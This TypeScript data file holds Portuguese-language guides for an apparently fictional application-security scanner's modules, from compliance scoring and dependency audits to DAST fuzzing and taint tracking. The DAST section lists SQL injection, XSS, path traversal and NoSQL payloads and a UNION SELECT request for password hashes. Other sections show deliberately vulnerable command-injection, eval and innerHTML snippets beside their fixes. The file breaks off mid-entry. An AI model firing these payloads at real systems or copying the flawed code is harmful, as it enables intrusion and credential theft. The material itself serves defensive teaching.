export interface ToolGuideItem {
  id: string;
  name: string;
  category: 'AppSec & SAST' | 'Defesa & Runtime' | 'Infraestrutura & DevSecOps' | 'Conformidade & Governança';
  badge: string;
  shortSummary: string;
  howItWorks: string;
  stepByStepGuide: {
    step: number;
    action: string;
    description: string;
  }[];
  example: {
    title: string;
    scenario: string;
    inputSnippet: string;
    systemDetection: string;
    outputRemediation: string;
  };
}

export const TOOL_GUIDES: Record<string, ToolGuideItem> = {
  compliance: {
    id: 'compliance',
    name: 'Auditoria de Conformidade (SOC 2, ISO 27001 & HIPAA)',
    category: 'Conformidade & Governança',
    badge: 'SOC2 / ISO / HIPAA',
    shortSummary: 'Mapeamento automatizado de vulnerabilidades e segredos do código contra os controles mandatórios do SOC 2 Type II, ISO/IEC 27001:2022 e HIPAA Security Rule com cálculo determinístico de índice de prontidão (Readiness Score).',
    howItWorks: `O motor analisa todos os achados coletados no repositório (segredos estáticos, injeções SQL, chamadas de sistema, senhas hardcoded, falhas criptográficas) e os correlaciona com uma base formal de controles regulatórios:
• SOC 2 Type II: Controles Trust Services Criteria CC6.1 (Acesso Lógico), CC6.6 (Fronteiras de Nuvem), CC6.7 (Criptografia), CC7.1 (Gestão de Vulnerabilidades) e CC8.1 (Gestão de Mudanças).
• ISO/IEC 27001:2022: Controles do Anexo A: A.5.15 (Acesso Privilegiado), A.8.9 (Configuração Segura), A.8.12 (DLP em Repositórios), A.8.24 (Criptografia) e A.8.28 (Codificação Segura).
• HIPAA Security Rule (45 CFR § 164.312): Salvaguardas técnicas para dados de saúde (ePHI), incluindo autenticação única § 164.312(a)(1), trilha de auditoria § 164.312(b), integridade contra injeções § 164.312(c)(1), verificação de entidades § 164.312(d) e criptografia em trânsito § 164.312(e)(1).
Para cada framework, é calculado um score de 0 a 100% ponderando a gravidade das violações (CRITICAL reduz 25%, HIGH 15%, MEDIUM 6%).`,
    stepByStepGuide: [
      {
        step: 1,
        action: 'Acessar a aba "Auditoria Compliance"',
        description: 'Clique na aba no menu superior ou use o atalho correspondente para visualizar o scorecard executivo global.'
      },
      {
        step: 2,
        action: 'Filtrar por Framework ou Status',
        description: 'Clique nos cards de SOC 2, ISO 27001 ou HIPAA para isolar controles específicos, ou filtre por status "Em Risco", "Degradados" ou "Conformes".'
      },
      {
        step: 3,
        action: 'Inspecionar Controles e Evidências SAST',
        description: 'Expanda qualquer controle em risco para ler a implicação formal de auditoria, recomendação técnica e a lista de arquivos e linhas violadoras.'
      },
      {
        step: 4,
        action: 'Exportar Relatório ou Memorando',
        description: 'Utilize os botões "Copiar Memorando", "Pacote JSON" ou "Relatório Auditoria (.md)" para anexar as evidências em auditorias externas ou tickets Jira.'
      }
    ],
    example: {
      title: 'Exemplo: Violação do Controle SOC 2 CC6.7 & HIPAA § 164.312(a)(1)',
      scenario: 'Um desenvolvedor armazenou uma chave mestra privada em src/services/authService.ts para autenticar microsserviços que acessam prontuários médicos de pacientes.',
      inputSnippet: `// Arquivo: src/services/authService.ts (Linha 14)
export const JWT_SECRET_KEY = "DEMO_SLACK_BOT_TOKEN_REDACTED";
export const DB_CONNECTION = "postgres://app_user:REDACTED_PASSWORD@prod-db.internal:5432/patients";`,
      systemDetection: `[SOC2-CC6-7] At Risk: Transmissão e armazenamento de credenciais sem proteção criptográfica adequada.
[HIPAA-164-312-A1] At Risk: Credencial fixa compartilhada impede auditoria individual de acesso a ePHI.
Impacto no Score: Redução de 40% na prontidão de SOC 2 e HIPAA.`,
      outputRemediation: `// Arquivo: src/services/authService.ts (Corrigido)
export const JWT_SECRET_KEY = process.env.JWT_SECRET_KEY;
export const DB_CONNECTION = process.env.DATABASE_URL;

// Arquivo: .env.example
JWT_SECRET_KEY=
DATABASE_URL=`
    }
  },

  sca: {
    id: 'sca',
    name: 'SCA - Análise de Composição de Software',
    category: 'AppSec & SAST',
    badge: 'CVE & Licenças',
    shortSummary: 'Auditoria de bibliotecas de terceiros (open-source) declaradas em package.json ou requirements.txt para identificar CVEs conhecidos com CVSS e riscos de licença copyleft (GPL/AGPL).',
    howItWorks: `O motor SCA realiza o parsing de arquivos de manifesto de dependências presentes no repositório. Para cada pacote e versão declarada:
1. Consulta a base interna de vulnerabilidades correlacionada com NVD (National Vulnerability Database), GitHub Advisory Database e OSV.
2. Identifica se a versão utilizada possui falhas críticas (ex.: Log4j, Prototype Pollution em lodash, RCE em jsonwebtoken).
3. Avalia o tipo de licença de software (MIT, Apache 2.0, BSD vs. GPL-3.0, AGPL-3.0) para prevenir contaminação jurídica de código proprietário fechado.
4. Sugere a versão mínima corrigida (Fix Version) para remediação com zero atrito.`,
    stepByStepGuide: [
      {
        step: 1,
        action: 'Abrir a aba "SCA (Dependências & CVEs)"',
        description: 'O sistema analisa instantaneamente os arquivos de manifesto existentes no workspace (ex: package.json).'
      },
      {
        step: 2,
        action: 'Filtrar por Severidade ou Risco de Licença',
        description: 'Filtre por "Vulneráveis", "Críticas/Altas" ou "Risco de Licença (Copyleft)" para priorizar os pacotes mais urgentes.'
      },
      {
        step: 3,
        action: 'Inspecionar Detalhes e CVEs',
        description: 'Clique em um pacote (ex: lodash ou jsonwebtoken) para abrir a barra lateral com CVSS, vetor de ataque e versão segura de upgrade.'
      },
      {
        step: 4,
        action: 'Copiar o Comando de Atualização',
        description: 'Copie o comando de upgrade pré-formatado (ex: npm install lodash@^4.17.21) e exporte o relatório em JSON.'
      }
    ],
    example: {
      title: 'Exemplo: Detecção de Prototype Pollution no Lodash',
      scenario: 'O arquivo package.json utiliza uma versão legada vulnerável que permite a atacantes injetar propriedades em Object.prototype e comprometer a execução do Node.js.',
      inputSnippet: `// Arquivo: package.json
{
  "dependencies": {
    "lodash": "4.17.15",
    "jsonwebtoken": "8.5.1"
  }
}`,
      systemDetection: `[CVE-2020-8203] lodash 4.17.15 - Prototype Pollution (CVSS 7.4 HIGH)
[CVE-2022-23529] jsonwebtoken 8.5.1 - Remote Code Execution (CVSS 9.8 CRITICAL)
Risco de Licença: Ambos utilizam licença MIT (Permissiva / Seguro).`,
      outputRemediation: `# Comando de atualização gerado pelo SecScan SCA:
npm install lodash@^4.17.21 jsonwebtoken@^9.0.2`
    }
  },

  iac: {
    id: 'iac',
    name: 'IaC Security (Docker, Kubernetes & CI/CD)',
    category: 'Infraestrutura & DevSecOps',
    badge: 'Docker & K8s',
    shortSummary: 'Verificação de segurança estática em arquivos de Infraestrutura como Código (Dockerfile, manifests Kubernetes, Helm e workflows do GitHub Actions).',
    howItWorks: `O scanner de IaC inspeciona a configuração de contêineres e orquestração buscando más práticas operacionais e brechas de segurança:
• Docker: Execução de processos como usuário root (ausência da instrução USER), imagens base sem tag de digest SHA (usando :latest), vazamento de credenciais em ENV/ARG, e falta de HEALTHCHECK.
• Kubernetes: Contêineres rodando em modo privilegiado (privileged: true), escalada de privilégios permitida (allowPrivilegeEscalation: true), montagem direta do socket do host (/var/run/docker.sock) e falta de NetworkPolicies.
• CI/CD: Workflows GitHub Actions rodando triggers inseguros como pull_request_target, steps com bash injection em \${{ github.event }} e actions de terceiros não fixadas por hash SHA.`,
    stepByStepGuide: [
      {
        step: 1,
        action: 'Navegar para a aba "IaC Security"',
        description: 'Visualize os arquivos de infraestrutura detectados no projeto divididos por categorias (Dockerfile, Kubernetes e CI/CD).'
      },
      {
        step: 2,
        action: 'Analisar Violações Encontradas',
        description: 'Examine cada card de violação com gravidade, linha afetada e a justificativa técnica de segurança.'
      },
      {
        step: 3,
        action: 'Revisar a Correção Sugerida',
        description: 'Clique no botão de visualização de código para ver a linha vulnerável comparada lado a lado com a sintaxe segura recomendada.'
      },
      {
        step: 4,
        action: 'Exportar Relatório de Auditoria de Infraestrutura',
        description: 'Faça o download do relatório completo em JSON para incorporar no gate de aprovação de Pull Requests.'
      }
    ],
    example: {
      title: 'Exemplo: Contêiner Docker Executando como Root & Imagem Unpinned',
      scenario: 'O Dockerfile de produção executa como superusuário e usa a tag node:latest sem fixação de versão imutável.',
      inputSnippet: `# Arquivo: Dockerfile (Inseguro)
FROM node:latest
WORKDIR /app
COPY . .
ENV AWS_SECRET_ACCESS_KEY="DEMO_AWS_SECRET_KEY_PLACEHOLDER"
RUN npm install
CMD ["node", "server.js"]`,
      systemDetection: `[IAC-DOCKER-ROOT] CRITICAL: Contêiner sem diretiva USER explícita executando como root (UID 0).
[IAC-DOCKER-LATEST] HIGH: Uso de tag flutuante ':latest' quebra a reprodutibilidade da imagem.
[IAC-DOCKER-ENV-SECRET] CRITICAL: Credencial de nuvem gravada na camada imutável da imagem.`,
      outputRemediation: `# Arquivo: Dockerfile (Corrigido)
FROM node:20.11.0-alpine@sha256:2d1d0f88a...
WORKDIR /app
COPY package*.json ./
RUN npm ci --only=production
COPY . .
USER node
HEALTHCHECK --interval=30s --timeout=5s CMD curl -f http://localhost:3000/health || exit 1
CMD ["node", "server.js"]`
    }
  },

  dast: {
    id: 'dast',
    name: 'DAST Simulator (Fuzzer de APIs & Headers)',
    category: 'AppSec & SAST',
    badge: 'Fuzzer & DAST',
    shortSummary: 'Simulador dinâmico de segurança que dispara vetores de injeção (SQLi, XSS, Path Traversal) contra endpoints mapeados e audita cabeçalhos de segurança HTTP.',
    howItWorks: `O DAST Simulator conecta os endpoints extraídos pelo motor LinkFinder e executa duas auditorias essenciais:
1. Fuzzing Ativo de Parâmetros: Gera e injeta payloads clássicos e evasivos em parâmetros de rota e corpo de requisições:
   - SQL Injection: ' OR '1'='1 --, 1; DROP TABLE users;
   - Cross-Site Scripting (XSS): <script>alert(document.domain)</script>, <img src=x onerror=alert(1)>
   - Path Traversal: ../../../../etc/passwd, ..\\..\\windows\\system32\\cmd.exe
   - NoSQL Injection: {"$gt": ""}
2. Auditoria de Cabeçalhos HTTP: Verifica se o servidor web envia os headers essenciais de proteção: Content-Security-Policy (CSP), Strict-Transport-Security (HSTS), X-Frame-Options (proteção contra Clickjacking), X-Content-Type-Options e Referrer-Policy.
3. Gerador cURL: Converte qualquer teste de injeção em um comando cURL pronto para ser disparado no terminal Linux/macOS.`,
    stepByStepGuide: [
      {
        step: 1,
        action: 'Acessar a aba "DAST (Fuzzer & Headers)"',
        description: 'Selecione a rota desejada na lista de endpoints identificados no projeto.'
      },
      {
        step: 2,
        action: 'Configurar o Tipo de Ataque & Payload',
        description: 'Escolha entre SQLi, XSS, Path Traversal ou NoSQL Injection e visualize o payload injetado.'
      },
      {
        step: 3,
        action: 'Disparar Simulação (Run Fuzz Test)',
        description: 'Clique em "Disparar Fuzzer" para analisar a resposta simulada e checar o comportamento de segurança.'
      },
      {
        step: 4,
        action: 'Copiar Comando cURL',
        description: 'Copie a linha de comando cURL para reproduzir a tentativa de exploração diretamente em ambientes de teste externos.'
      }
    ],
    example: {
      title: 'Exemplo: Teste de Injeção SQL em Endpoint de Busca',
      scenario: 'A rota GET /api/v1/search aceita um parâmetro "q" que é concatenado diretamente em uma query SQL sem parametrização.',
      inputSnippet: `// Requisição Testada:
GET /api/v1/search?q=' OR 1=1 UNION SELECT id, username, password_hash FROM users -- HTTP/1.1
Host: api.example.com`,
      systemDetection: `[DAST-SQLI-DETECTED] CRITICAL: O endpoint respondeu com dados adicionais não restritos, indicando ausência de Prepared Statements.
[HEADER-MISSING-CSP] HIGH: Resposta sem cabeçalho Content-Security-Policy.
[HEADER-MISSING-HSTS] MEDIUM: Resposta sem Strict-Transport-Security.`,
      outputRemediation: `# Comando cURL para teste no terminal:
curl -X GET "http://localhost:3000/api/v1/search?q=%27%20OR%201%3D1%20--" \\
  -H "Accept: application/json" -v

# Remediação recomendada no backend:
# Utilizar parâmetros vinculados (Parameterized Queries / ORM) e configurar middleware Helmet no Express.`
    }
  },

  sbom: {
    id: 'sbom',
    name: 'SBOM Generator & Assinatura de Software',
    category: 'Infraestrutura & DevSecOps',
    badge: 'CycloneDX / SPDX',
    shortSummary: 'Geração de Software Bill of Materials nos padrões OWASP CycloneDX v1.5 e SPDX v2.3, com hashes criptográficos SHA-256 e comandos de atestação com Cosign / Sigstore.',
    howItWorks: `O gerador de SBOM constrói o inventário digital formal de todos os componentes da aplicação:
1. Mapeia cada pacote dependente com seu Package URL padronizado (purl: pkg:npm/nome@versão).
2. Calcula hashes criptográficos de integridade SHA-256 para assegurar imutabilidade.
3. Formata a lista nos dois esquemas internacionais exigidos por regulamentações globais (como a Ordem Executiva dos EUA 14028):
   - OWASP CycloneDX v1.5 JSON (focado em segurança cibernética e dependências).
   - SPDX v2.3 JSON (focado em conformidade de licenciamento de software da Linux Foundation).
4. Gera scripts prontos para assinatura digital da cadeia de suprimentos usando chaves efêmeras com Cosign / Sigstore.`,
    stepByStepGuide: [
      {
        step: 1,
        action: 'Abrir a aba "SBOM Generator"',
        description: 'Visualize o catálogo consolidado de metadados da aplicação, autor, licenças e componentes.'
      },
      {
        step: 2,
        action: 'Alternar entre CycloneDX e SPDX',
        description: 'Clique nas abas "CycloneDX v1.5" ou "SPDX v2.3" para inspecionar a árvore estruturada JSON em tempo real.'
      },
      {
        step: 3,
        action: 'Fazer Download do Arquivo SBOM',
        description: 'Clique no botão "Download SBOM (.json)" para obter o arquivo que deve acompanhar o release da aplicação.'
      },
      {
        step: 4,
        action: 'Copiar Script de Assinatura Cosign',
        description: 'Copie os comandos para assinar o SBOM e anexá-lo ao registro do contêiner OCI no CI/CD.'
      }
    ],
    example: {
      title: 'Exemplo: Componente Declarado no Formato CycloneDX v1.5',
      scenario: 'Gerar o atestado formal de proveniência para uma biblioteca externa utilizada no microsserviço de autenticação.',
      inputSnippet: `{
  "bomFormat": "CycloneDX",
  "specVersion": "1.5",
  "version": 1,
  "components": [
    {
      "type": "library",
      "name": "jsonwebtoken",
      "version": "9.0.2",
      "purl": "pkg:npm/jsonwebtoken@9.0.2",
      "hashes": [
        { "alg": "SHA-256", "content": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855" }
      ],
      "licenses": [{ "license": { "id": "MIT" } }]
    }
  ]
}`,
      systemDetection: `Validação Estrutural: Conforme com a especificação oficial OWASP CycloneDX v1.5.
Licenças: MIT identificada com compatibilidade livre de contaminação copyleft.`,
      outputRemediation: `# Comando de Assinatura Digital com Cosign:
cosign sign-blob --key cosign.key --output-signature sbom.sig sbom-cyclonedx.json
# Verificação na esteira de produção:
cosign verify-blob --key cosign.pub --signature sbom.sig sbom-cyclonedx.json`
    }
  },

  entropy: {
    id: 'entropy',
    name: 'Caçador de Segredos por Entropia de Shannon & Git',
    category: 'AppSec & SAST',
    badge: 'Shannon & Git',
    shortSummary: 'Detecção matemática de chaves e segredos embutidos por cálculo de entropia da teoria da informação de Claude Shannon, acompanhado de inspeção forense no histórico de commits do Git.',
    howItWorks: `A ferramenta atua em duas frentes complementares:
1. Cálculo de Entropia de Shannon: Mede a aleatoriedade de cada string de código usando a fórmula estatística:
   H(X) = - ∑ P(x) * log2(P(x))
   Chaves criptográficas (como tokens base64, chaves privadas e senhas fortes) possuem alta entropia (geralmente acima de 4.2 a 4.8 bits/char), enquanto variáveis comuns ("getUserById") possuem baixa entropia (< 3.0).
2. Git History Inspector: Procura por "segredos fantasmas" que foram removidos do código atual, mas continuam eternizados no histórico do repositório (.git/objects) através de commits anteriores.
3. Comando de Purga: Gera a linha de comando de higienização do histórico via git-filter-repo ou BFG Repo-Cleaner.`,
    stepByStepGuide: [
      {
        step: 1,
        action: 'Acessar a aba "Entropia & Segredos Git"',
        description: 'Visualize a lista de strings com densidade de entropia calculada e o ranking de aleatoriedade.'
      },
      {
        step: 2,
        action: 'Ajustar o Limiar de Sensibilidade',
        description: 'Mova o controle deslizante (slider) de entropia entre 3.0 e 5.5 bits/char para refinar e filtrar ruídos.'
      },
      {
        step: 3,
        action: 'Verificar Segredos no Histórico Git',
        description: 'Consulte a seção de commits passados para identificar credenciais vazadas que continuam acessíveis no git log.'
      },
      {
        step: 4,
        action: 'Copiar Comando de Higienização Git',
        description: 'Copie o script para reescrever o histórico do Git e revogar imediatamente as credenciais ativas.'
      }
    ],
    example: {
      title: 'Exemplo: Chave de API de Alta Entropia Detectada',
      scenario: 'Uma chave de autenticação privada foi atribuída a uma constante com nome genérico que escaparia de regex comuns baseados em "api_key".',
      inputSnippet: `// Arquivo: src/config/internal.ts (Linha 42)
const secretVal = "aGksaW1wb3J0YW50X3NlY3JldF9rZXlfOTk4ODc3NjY1NTRhYmM="; // Entropia: 4.89 bits/char`,
      systemDetection: `[ENTROPY-HIGH] Risco Crítico: String com 56 caracteres e entropia de 4.89 bits/char (Limiar configurado: 4.20).
Padrão detectado: Base64 encodado contendo credencial de alta densidade informativa.`,
      outputRemediation: `# Como expurgar segredos vazados no histórico Git:
git filter-repo --path src/config/internal.ts --invert-paths --force

# E rotacionar a chave no painel do provedor imediatamente!`
    }
  },

  threatmodel: {
    id: 'threatmodel',
    name: 'Modelagem de Ameaças STRIDE & Calculadora CVSS v3.1',
    category: 'AppSec & SAST',
    badge: 'STRIDE & CVSS',
    shortSummary: 'Mapeamento das superfícies e rotas do sistema na metodologia STRIDE da Microsoft, checklist de conformidade OWASP ASVS v4.0.3 e calculadora oficial de severidade CVSS v3.1.',
    howItWorks: `A ferramenta estrutura a governança de risco em 3 módulos de engenharia de segurança:
1. Matriz STRIDE: Classifica os riscos por categoria de ameaça:
   - S (Spoofing): Falsificação de identidade e credenciais fracas.
   - T (Tampering): Adulteração de dados em trânsito ou sem integridade.
   - R (Repudiation): Ações sem registro ou trilha de auditoria não-repudiável.
   - I (Information Disclosure): Vazamento de segredos, dumps de erro e credenciais.
   - D (Denial of Service): Ataques de negação de serviço e loops desprotegidos.
   - E (Elevation of Privilege): Falhas de autorização e injeções de comando.
2. OWASP ASVS (Application Security Verification Standard): Lista de checagem estruturada dos capítulos V1 a V8.
3. Calculadora Oficial CVSS v3.1: Permite calcular interativamente o Base Score (0.0 a 10.0), Subscore de Impacto e Explorabilidade, gerando o vetor padronizado (ex: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N).`,
    stepByStepGuide: [
      {
        step: 1,
        action: 'Abrir a aba "Modelagem STRIDE & CVSS"',
        description: 'Examine o painel com as 6 dimensões STRIDE e os achados automaticamente categorizados.'
      },
      {
        step: 2,
        action: 'Navegar pela Matriz STRIDE',
        description: 'Clique em cada categoria (ex: Spoofing ou Information Disclosure) para entender ameaças associadas ao código.'
      },
      {
        step: 3,
        action: 'Utilizar a Calculadora CVSS v3.1',
        description: 'Alterne os parâmetros de Attack Vector (AV), Privileges Required (PR), Confidentiality (C), etc., para calibrar a nota de risco.'
      },
      {
        step: 4,
        action: 'Copiar o Vetor CVSS',
        description: 'Copie a string canônica do vetor para colar em relatórios executivos de pentest ou triagens de Bug Bounty.'
      }
    ],
    example: {
      title: 'Exemplo: Avaliação CVSS v3.1 para Injeção de Comando',
      scenario: 'Uma chamada a child_process.exec recebe entrada do usuário sem sanitização na rota POST /api/v1/tools/ping.',
      inputSnippet: `// Rota vulnerável:
app.post('/api/v1/tools/ping', (req, res) => {
  exec('ping -c 1 ' + req.body.host, (err, stdout) => res.send(stdout));
});`,
      systemDetection: `Classificação STRIDE: Elevation of Privilege (E) & Tampering (T).
Vetor CVSS v3.1: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
Base Score: 9.8 CRITICAL (Attack Vector: Network, Attack Complexity: Low, Privileges: None, Impact: High em CIA).`,
      outputRemediation: `// Código Corrigido com Validação e Parâmetros Separados:
import { execFile } from 'child_process';
import validator from 'validator';

if (!validator.isIP(req.body.host)) {
  return res.status(400).json({ error: 'IP inválido' });
}
execFile('ping', ['-c', '1', req.body.host], (err, stdout) => res.send(stdout));`
    }
  },

  autoremediation: {
    id: 'autoremediation',
    name: 'Auto-Remediação Inteligente & Patches (1-Click)',
    category: 'AppSec & SAST',
    badge: '1-Click Patch',
    shortSummary: 'Geração automatizada de Git Unified Diffs (--- / +++) para corrigir segredos expostos, injeções de eval e credenciais estáticas com aplicação direta no código em memória.',
    howItWorks: `O motor de remediação atua como um assistente cirúrgico de engenharia:
1. Para cada vulnerabilidade detectada, o motor cria um patch padronizado Git Unified Diff mostrando exatamente as linhas excluídas (-) e adicionadas (+).
2. Substitui a credencial hardcoded por uma variável de ambiente (ex: process.env.SERVICE_API_KEY).
3. Adiciona a declaração correspondente no arquivo .env.example (sem o segredo, apenas a chave vazia) para documentar a dependência aos operadores.
4. Botão "Aplicar Patch no Código": Ao clicar, o SecScan reescreve o arquivo no sistema de arquivos virtual em memória e reexecuta automaticamente a análise SAST, demonstrando em tempo real que o risco foi eliminado!`,
    stepByStepGuide: [
      {
        step: 1,
        action: 'Abrir a aba "Auto-Remediação (Patches)"',
        description: 'Visualize a lista de patches automáticos gerados para cada vulnerabilidade do workspace.'
      },
      {
        step: 2,
        action: 'Inspecionar o Git Unified Diff',
        description: 'Examine o diff colorido verde/vermelho para certificar-se de que a alteração preserva a lógica do software.'
      },
      {
        step: 3,
        action: 'Aplicar Patch com 1 Clique',
        description: 'Clique no botão "Aplicar Patch no Código". O arquivo é atualizado em tempo real e a varredura é refeita.'
      },
      {
        step: 4,
        action: 'Baixar Arquivo .patch',
        description: 'Ou baixe o arquivo unificado .patch para aplicar em seu repositório local usando "git apply patch.diff".'
      }
    ],
    example: {
      title: 'Exemplo: Remediação de Token JWT Hardcoded',
      scenario: 'O arquivo authController.ts continha um segredo HMAC estático no código-fonte.',
      inputSnippet: `--- a/src/controllers/authController.ts
+++ b/src/controllers/authController.ts
@@ -10,3 +10,3 @@
-const JWT_SECRET = "super-secret-jwt-key-xyz-123456789";
+const JWT_SECRET = process.env.JWT_SECRET;
+if (!JWT_SECRET) throw new Error("JWT_SECRET não configurado no ambiente");`,
      systemDetection: `Patch Aplicado com Sucesso: O arquivo authController.ts foi reescrito.
O arquivo .env.example recebeu a chave JWT_SECRET=.
Novo Risk Score do Workspace: Reduzido imediatamente.`,
      outputRemediation: `# Como aplicar em repositórios Git reais:
git apply fix-jwt-secret.patch`
    }
  },

  iast: {
    id: 'iast',
    name: 'IAST (Interactive Application Security Testing)',
    category: 'AppSec & SAST',
    badge: 'Runtime Hooks',
    shortSummary: 'Testes de segurança interativos em tempo de execução com instrumentação de ganchos (hooks) em sinks perigosos para flagrar contaminação ativa de dados.',
    howItWorks: `Diferente do SAST tradicional (que analisa apenas texto parado), o IAST inspeciona o comportamento do código em execução:
1. Injeta wrappers e proxies transparentes (runtime hooks) em funções críticas da runtime:
   - eval(), Function(), setTimeout(string)
   - document.innerHTML, outerHTML, document.write()
   - child_process.exec(), child_process.spawn()
   - consultas de banco de dados (db.query, MongoClient.find)
2. Quando uma função é chamada durante a execução da aplicação ou suíte de testes, o hook valida se o argumento possui dados não sanitizados vindos do usuário (tainted).
3. Caso detectado, emite um alerta com a pilha de chamadas real (stack trace) e o valor exato que chegou ao sink perigoso.`,
    stepByStepGuide: [
      {
        step: 1,
        action: 'Navegar até a aba "IAST (Runtime Hooks)"',
        description: 'Visualize os ganchos ativos instalados no ambiente de execução.'
      },
      {
        step: 2,
        action: 'Simular Execução de Código',
        description: 'Clique nos botões de teste interativo para acionar chamadas instrumentadas e ver o interceptor em ação.'
      },
      {
        step: 3,
        action: 'Analisar Trilha de Execução e Stack Trace',
        description: 'Inspecione a chamada interceptada, a função de origem e se o parâmetro foi higienizado antes do sink.'
      },
      {
        step: 4,
        action: 'Exportar Telemetria IAST',
        description: 'Exporte os eventos de runtime para alimentar sistemas SIEM ou ferramentas de monitoramento APM.'
      }
    ],
    example: {
      title: 'Exemplo: Hook Interceptando Chamada ao Eval Dinâmico',
      scenario: 'Uma chamada a eval() foi disparada com payload contendo parâmetros de requisição HTTP sem validação.',
      inputSnippet: `// Chamada interceptada em tempo de execução:
eval("calcTotal(" + userInput + ")"); // Onde userInput = "10); alert(document.cookie); //"`,
      systemDetection: `[IAST-HOOK-EVAL] BLOQUEADO/FLAGRADO em Runtime:
Sink: globalThis.eval
Valor Contaminado: "calcTotal(10); alert(document.cookie); //)"
Origem: req.query.userInput
Stack: at calculateDiscount (discountService.ts:28)`,
      outputRemediation: `// Correção: Substituir eval por um parser seguro:
import { parseMathExpression } from '../utils/safeMath';
const result = parseMathExpression(userInput);`
    }
  },

  dataflow: {
    id: 'dataflow',
    name: 'Grafo de Fluxo de Dados & Taint (D3)',
    category: 'AppSec & SAST',
    badge: 'Taint Graph',
    shortSummary: 'Rastreamento visual de contaminação ponto a ponto conectando Fontes de Entrada (Sources), Consumidores, Sanitizadores e Sinks Críticos.',
    howItWorks: `O motor constrói um grafo direcionado com base na AST do código:
• Sources (Azul): Entradas externas não confiáveis (req.body, req.query, req.params, location.hash, postMessage).
• Consumers (Cinza): Funções intermediárias e rotas que repassam as variáveis.
• Sanitizers (Verde): Métodos de higienização (DOMPurify.sanitize, validator.escape).
• Sinks (Vermelho): Funções onde dados não sanitizados geram falhas graves (innerHTML -> XSS, exec -> RCE, query -> SQLi).
O painel renderiza nós interativos via D3.js com suporte a zoom-to-fit (tecla F), modo pan livre (tecla P) e visualizador de trilha delta.`,
    stepByStepGuide: [
      {
        step: 1,
        action: 'Acessar "Fluxo & Sinks (D3)"',
        description: 'Visualize a topologia completa de fluxo de dados do código-fonte.'
      },
      {
        step: 2,
        action: 'Navegar pelo Grafo com Atalhos',
        description: 'Use a tecla F para centralizar (Fit), arraste o canvas livremente e use a roda do mouse para zoom.'
      },
      {
        step: 3,
        action: 'Filtrar por Trilha Contaminada (Taint)',
        description: 'Clique em um nó vermelho (Sink) para iluminar todo o caminho percorrido desde a rota de entrada.'
      },
      {
        step: 4,
        action: 'Ver Sugestão de Sanitização',
        description: 'Inspecione a recomendação do SecScan sobre onde posicionar a função de sanitização na cadeia.'
      }
    ],
    example: {
      title: 'Exemplo: Trilha de XSS do Endpoint até innerHTML',
      scenario: 'A rota GET /profile lê o parâmetro "theme" e o insere diretamente no DOM sem escapar caracteres especiais.',
      inputSnippet: `// Source: req.query.theme
const userTheme = req.query.theme;
// Consumer: applyTheme(userTheme)
// Sink Perigoso:
document.getElementById('theme-container').innerHTML = userTheme;`,
      systemDetection: `Trilha de Contaminação Detectada:
[Source: req.query.theme] -> [Consumer: applyTheme] -> [Sink: innerHTML]
Status: NÃO SANITIZADO (Vulnerável a DOM XSS).`,
      outputRemediation: `// Inserção do Sanitizador recomendado:
import DOMPurify from 'dompurify';
document.getElementById('theme-container').innerHTML = DOMPurify.sanitize(userTheme);`
    }
  },

  scanner: {
    id: 'scanner',
    name: 'Inspetor de Código & Árvore de Arquivos',
    category: 'AppSec & SAST',
    badge: 'Linha a Linha',
    shortSummary: 'Explorador hierárquico de arquivos do workspace com marcação visual de linhas vulneráveis, máscaras de segredos e sugestões de correção inline.',
    howItWorks: `Permite auditar visualmente o código-fonte como em uma IDE:
• Exibe a árvore de diretórios à esquerda destacando com badges coloridas quais arquivos possuem achados críticos.
• Na área central, renderiza o arquivo selecionado com números de linha e realce em vermelho/amarelo sobre a instrução violadora.
• Painel inferior com a regra violada, descrição de remediação, link para OWASP/CWE e snippet pronto de correção.`,
    stepByStepGuide: [
      {
        step: 1,
        action: 'Abrir "Inspetor de Código"',
        description: 'Navegue pela árvore de arquivos à esquerda e selecione qualquer arquivo (ex: paymentController.ts).'
      },
      {
        step: 2,
        action: 'Clicar no Marcador de Linha',
        description: 'Clique na linha destacada em vermelho para inspecionar os detalhes da vulnerabilidade.'
      },
      {
        step: 3,
        action: 'Copiar Snippet Corrigido',
        description: 'Clique em "Copiar Correção" para obter o trecho de código seguro formatado.'
      },
      {
        step: 4,
        action: 'Colar Novo Código (Paste Code)',
        description: 'Utilize o botão "Paste Code" no topo para colar e auditar qualquer trecho avulso de código.'
      }
    ],
    example: {
      title: 'Exemplo: Chave AWS Hardcoded no paymentController.ts',
      scenario: 'O desenvolvedor declarou a credencial da AWS diretamente no código.',
      inputSnippet: `const AWS_ACCESS_KEY = "DEMO_AWS_AKID_EXAMPLE_KEY_01";
const AWS_SECRET_KEY = "DEMO_AWS_SECRET_KEY_SAMPLE_TEST_KEY_40";`,
      systemDetection: `Regra Violada: AWS Access Key ID (HIGH) & Secret Access Key (CRITICAL)
Arquivo: src/controllers/paymentController.ts:18
Máscara: DEMO_AWS_AKID_***`,
      outputRemediation: `const AWS_ACCESS_KEY = process.env.AWS_ACCESS_KEY_ID;
const AWS_SECRET_KEY = process.env.AWS_SECRET_ACCESS_KEY;`
    }
  },

  endpoints: {
    id: 'endpoints',
    name: 'LinkFinder (Mapeamento de Rotas & APIs)',
    category: 'AppSec & SAST',
    badge: 'API Discovery',
    shortSummary: 'Varredura estática profunda de arquivos JavaScript/TypeScript para descobrir endpoints de API REST, GraphQL, chamadas fetch/axios e rotas administrativas ocultas.',
    howItWorks: `Inspeciona o código-fonte procurando strings que formam URLs e rotas (/api/*, /v1/*, https://*), métodos HTTP associados (GET, POST, PUT, DELETE) e parâmetros de query ou corpo. Mapeia superfícies de ataque externas e endpoints de depuração (/internal/*, /admin/*).`,
    stepByStepGuide: [
      {
        step: 1,
        action: 'Abrir a aba "LinkFinder (APIs)"',
        description: 'Visualize a tabela com todos os endpoints descobertos agrupados por protocolo e método.'
      },
      {
        step: 2,
        action: 'Filtrar por Risco ou Método HTTP',
        description: 'Filtre por endpoints potencialmente sensíveis (ex: /admin, /auth, /payments) ou métodos de mutação (POST/DELETE).'
      },
      {
        step: 3,
        action: 'Inspecionar Código de Origem',
        description: 'Clique no link do arquivo para ir direto à linha onde a chamada da API foi declarada.'
      },
      {
        step: 4,
        action: 'Exportar Lista de Rotas',
        description: 'Exporte o inventário de endpoints em formato JSON para importar em ferramentas como Postman, Burp Suite ou ZAP.'
      }
    ],
    example: {
